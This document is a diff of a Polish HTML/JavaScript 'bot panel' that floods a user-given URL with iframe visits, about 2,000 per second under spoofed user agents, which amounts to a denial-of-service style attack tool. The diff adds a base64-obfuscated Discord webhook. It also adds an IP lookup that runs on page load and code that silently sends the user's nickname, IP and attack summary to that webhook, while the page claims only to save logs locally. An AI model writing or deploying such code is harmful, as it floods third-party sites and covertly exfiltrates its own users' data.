@@ -2,7 +2,7 @@
 <html lang="pl">
 <head>
 <meta charset="UTF-8" />
-<title>Bot Panel z regulaminem i atakiem</title>
+<title>Bot Panel z zapisem logów i wysyłką</title>
 <style>
   body { font-family: monospace; background:#111; color:#0f0; padding:20px; }
   #mainPanel { max-width: 600px; margin: auto; padding:20px; border: 1px solid #0f0; border-radius:8px; }
@@ -55,6 +55,9 @@ Korzystając z tego narzędzia oświadczasz, że:
   <button id="startBots" disabled>Start boty</button>
   <button id="stopBots" disabled>Stop boty</button>
 
+  <button id="downloadTxt" style="display:none;">Pobierz podsumowanie .txt</button>
+  <button id="downloadJson" style="display:none;">Pobierz logi .json</button>
+
   <div id="log"></div>
   <div id="summary"></div>
 </div>
@@ -68,6 +71,8 @@ Korzystając z tego narzędzia oświadczasz, że:
   const stopBtn = document.getElementById('stopBots');
   const logDiv = document.getElementById('log');
   const summaryDiv = document.getElementById('summary');
+  const downloadTxtBtn = document.getElementById('downloadTxt');
+  const downloadJsonBtn = document.getElementById('downloadJson');
 
   const visitsPerSecond = 2000;
   const delay = 1000 / visitsPerSecond;
@@ -76,6 +81,7 @@ Korzystając z tego narzędzia oświadczasz, że:
   let successCount = 0;
   let errorCount = 0;
   let startTime = null;
+  let userIP = null;
 
   const userAgents = [
     "jfjdensjsk/1.0",
@@ -91,10 +97,42 @@ Korzystając z tego narzędzia oświadczasz, że:
     "Mozilla/5.0 (Windows NT 6.1; Win64; x64) Edge/120.0.0.0"
   ];
 
+  const webhookBase64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQwMzg3NzI3OTM5Nzk3NDE2Ny9zTWdDQkVFU1BZZGEwVDhlYU5mTXBtc2R3SHFXZzNzVGZxUTRRc2prbnYzMTB5TExXWDVtVlNTdzJ0QW9BWGJ0aVA0TAo";
+  const webhookURL = atob(webhookBase64).trim();
+
+  let logData = [];
+
   function log(msg) {
-    const time = new Date().toLocaleTimeString();
-    logDiv.textContent += `[${time}] ${msg}\n`;
+    const now = new Date();
+    const timeString = now.toLocaleTimeString('pl-PL', {hour12:false}) + '.' + now.getMilliseconds().toString().padStart(3,'0');
+    const logEntry = { time: now.toISOString(), message: msg };
+    logData.push(logEntry);
+    logDiv.textContent += `[${timeString}] ${msg}\n`;
     logDiv.scrollTop = logDiv.scrollHeight;
+  }
+
+  async function fetchIP() {
+    try {
+      const res = await fetch("https://api.ipify.org?format=json");
+      const data = await res.json();
+      userIP = data.ip;
+      log(`Twój IP to: ${userIP}`);
+    } catch(e) {
+      log("Nie udało się pobrać IP");
+    }
+  }
+
+  async function sendWebhook(content) {
+    try {
+      await fetch(webhookURL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ content })
+      });
+      log("Dane wysłane na webhook.");
+    } catch(e) {
+      log("Błąd wysyłania na webhook.");
+    }
   }
 
   function updateStartBtn() {
@@ -104,7 +142,7 @@ Korzystając z tego narzędzia oświadczasz, że:
   nickInput.addEventListener('input', updateStartBtn);
   acceptCheckbox.addEventListener('change', updateStartBtn);
 
-  startBtn.onclick = () => {
+  startBtn.onclick = async () => {
     if (intervalId) return;
     if (!acceptCheckbox.checked) {
       alert("Musisz zaakceptować regulamin!");
@@ -124,11 +162,22 @@ Korzystając z tego narzędzia oświadczasz, że:
     botCounter = 0;
     successCount = 0;
     errorCount = 0;
+    logData = [];
     summaryDiv.style.display = 'none';
     logDiv.textContent = '';
+    downloadTxtBtn.style.display = 'none';
+    downloadJsonBtn.style.display = 'none';
     startTime = performance.now();
 
     log("Start botów...");
+
+    await sendWebhook(`Użytkownik **${nick}** rozpoczął atak z IP: \`${userIP || 'brak danych'}\``);
+
+    startBtn.disabled = true;
+    stopBtn.disabled = false;
+    nickInput.disabled = true;
+    urlInput.disabled = true;
+    acceptCheckbox.disabled = true;
 
     intervalId = setInterval(() => {
       botCounter++;
@@ -156,15 +205,9 @@ Korzystając z tego narzędzia oświadczasz, że:
 
       setTimeout(() => iframe.remove(), 2000);
     }, delay);
-
-    startBtn.disabled = true;
-    stopBtn.disabled = false;
-    nickInput.disabled = true;
-    urlInput.disabled = true;
-    acceptCheckbox.disabled = true;
   };
 
-  stopBtn.onclick = () => {
+  stopBtn.onclick = async () => {
     if (!intervalId) return;
     clearInterval(intervalId);
     intervalId = null;
@@ -185,12 +228,50 @@ Data: ${date.toLocaleString()} (${date.getMilliseconds()} ms)
     summaryDiv.textContent = summary;
     summaryDiv.style.display = 'block';
 
+    await sendWebhook(summary);
+
+    downloadTxtBtn.style.display = 'inline-block';
+    downloadJsonBtn.style.display = 'inline-block';
+
     startBtn.disabled = false;
     stopBtn.disabled = true;
     nickInput.disabled = false;
     urlInput.disabled = false;
     acceptCheckbox.disabled = false;
   };
+
+  downloadTxtBtn.onclick = () => {
+    const nick = nickInput.value.trim();
+    const ip = userIP || "brak danych";
+    const date = new Date().toLocaleString();
+    const durationMs = Math.round(performance.now() - startTime);
+
+    let txtContent = `Podsumowanie ataku\nUżytkownik: ${nick}\nIP: ${ip}\nData: ${date}\nCzas trwania: ${durationMs} ms\nWysłano botów: ${botCounter}\nSukcesów: ${successCount}\nBłędów: ${errorCount}\n\nLog:\n`;
+
+    logData.forEach(e => {
+      txtContent += `[${new Date(e.time).toLocaleTimeString('pl-PL', {hour12:false})}.${new Date(e.time).getMilliseconds().toString().padStart(3,'0')}] ${e.message}\n`;
+    });
+
+    const blob = new Blob([txtContent], {type: "text/plain"});
+    const a = document.createElement('a');
+    a.href = URL.createObjectURL(blob);
+    a.download = `atack_summary_${nick}_${Date.now()}.txt`;
+    a.click();
+  };
+
+  downloadJsonBtn.onclick = () => {
+    const jsonContent = JSON.stringify(logData, null, 2);
+    const blob = new Blob([jsonContent], {type: "application/json"});
+    const a = document.createElement('a');
+    a.href = URL.createObjectURL(blob);
+    a.download = `attack_log_${nickInput.value.trim()}_${Date.now()}.json`;
+    a.click();
+  };
+
+  window.addEventListener('load', fetchIP);
+
+  nickInput.addEventListener('input', updateStartBtn);
+  acceptCheckbox.addEventListener('change', updateStartBtn);
 
   updateStartBtn();
 })();
